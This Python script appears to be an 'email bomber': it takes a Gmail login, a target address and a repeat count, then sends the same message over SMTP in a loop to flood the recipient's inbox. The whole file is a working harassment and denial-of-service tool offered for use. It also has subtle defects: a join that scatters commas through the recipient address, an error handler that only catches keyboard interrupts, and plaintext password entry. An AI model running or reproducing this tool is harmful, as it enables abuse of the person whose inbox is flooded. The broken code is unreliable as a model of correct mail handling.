import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Setting up default things
port = 587  # For starttls
smtp_server = "smtp.gmail.com"

# Taking the inputs from the user
sender_mail = input("Type your mail and press enter: ")
print(' ')

sender_pass = input("Type your password and press enter: ")
print(' ')

reciever = input("Type the reciever mail address and press enter:")
print(' ')

message = input("Type your the email you want to send: ")
print(' ')

subject = input("Type the subject: ")

bomb_times = int(input("How many times do you want to send this mail?: "))
print(' ')

# Sending the mails 
mail = MIMEText(message, "html", "utf-8")
mail["From"] = sender_mail
mail["Subject"] = subject
mail["To"] = ",".join(reciever)
mail = mail.as_string()
try:
    server = smtplib.SMTP('smtp.gmail.com:587') 
    server.starttls() 
    server.login(sender_mail, sender_pass)   
    while bomb_times > 0:
        server.sendmail(sender_mail, reciever, mail) 
        print("Mail sent!")
        bomb_times = bomb_times - 1
        
except KeyboardInterrupt:
    print("An error has occured")